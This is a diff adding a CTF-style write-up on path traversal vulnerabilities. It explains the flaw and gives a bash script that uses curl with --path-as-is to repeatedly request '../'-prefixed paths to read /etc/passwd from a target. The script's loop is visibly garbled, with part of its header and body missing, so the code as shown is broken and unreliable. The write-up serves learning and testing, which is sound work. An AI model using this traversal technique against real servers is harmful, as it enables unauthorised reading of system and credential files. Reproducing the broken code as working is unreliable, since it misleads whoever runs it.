@@ -1,0 +1,59 @@
+---
+title: Path Traversal
+date: '2025-02-16'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - LFI
+  - LINUX
+  - PAYLOAD
+cover: /mc/uploads/2025/02/path.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+## Understanding Path Traversal Vulnerabilities
+
+A **Path Traversal or directory traversal** vulnerability occurs when a web application insecurely accesses files from the server's local filesystem using untrusted user input. Attackers can exploit this to read sensitive files outside the intended web directory by manipulating input parameters.
+
+Imagine a library where a librarian retrieves books based on your requests. If you ask for "about us," the librarian should hand you `about.html` or `about.php`. However, if there’s a misconfiguration, the librarian might blindly trust *any* request. For instance, if you ask for `../../etc/passwd`, they might accidentally fetch and reveal that restricted system file.
+
+While path traversal itself is primarily about unauthorized file access, it can sometimes be a stepping stone to more severe attacks. If the accessed files contain sensitive information or if the vulnerability is combined with other weaknesses (like Local File Inclusion), it could potentially lead to information disclosure, authentication bypass, or even code execution in certain scenarios.
+
+## Path\_traversal\_SCRIPT
+
+To test for path traversal vulnerabilities, I use the following script. It attempts directory traversal by appending `../` repeatedly to a payload and checks if the target file (e.g., `/etc/passwd`) is accessible:
+
+```bash
+#!/bin/bash
+
+url="http://example.com/" 
+string="../"
+payload="download?ticket="
+file="etc/passwd" # without the first /
+
+for ((i=0; i $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+How to Use
+
+- Replace `url` with the target URL and `file` with the desired file (e.g., `etc/passwd`).
+- run the script
+
+```bash
+$chmod +x script.sh
+$./script.sh
+```
+### Key Notes
+
+- **Success Condition**: A `200` status code indicates the file was retrieved. The script then prints its contents.
+- **How It Works**: The script iterates up to 10 times, appending `../` to bypass directory restrictions. The `--path-as-is` flag in `curl` prevents URL normalization, ensuring traversal payloads are sent as-is.
+
+By automating path traversal attempts, this script helps identify misconfigured endpoints vulnerable to Path traversal .
